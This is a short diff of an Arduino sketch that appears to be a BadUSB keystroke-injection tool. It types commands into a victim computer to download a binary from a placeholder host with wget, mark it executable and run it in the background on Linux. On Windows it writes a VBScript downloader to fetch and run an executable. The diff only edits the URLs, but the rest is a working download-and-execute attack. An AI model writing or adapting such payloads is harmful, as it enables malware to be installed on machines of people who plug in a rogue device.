@@ -7,7 +7,7 @@ void setup() {
   delay(3000);
   Keyboard.println("rm xxoo.out");
   delay(2000);
-  Keyboard.println("wget http://www.test.com/test.exe(linux) -O xxoo.out");
+  Keyboard.println("wget http://www.test.com/test.exe -O xxoo.out");
   delay(2000);
   Keyboard.println("chmod +x xxoo.out");
   Keyboard.println("./xxoo.out &");
@@ -21,7 +21,7 @@ void setup() {
   delay(myKeyBreak);
   ascii_println("del x.exe");
   delay(myKeyBreak);
-  ascii_println("echo strFileURL = \"http://www.test.com/test.exe(win)\" > K8.vbs");
+  ascii_println("echo strFileURL = \"http://www.test.com/test.exe\" > K8.vbs");
   delay(myKeyBreak);
   ascii_println("echo strHDLocation = \"x.exe\" >> K8.vbs");
   delay(myKeyBreak);
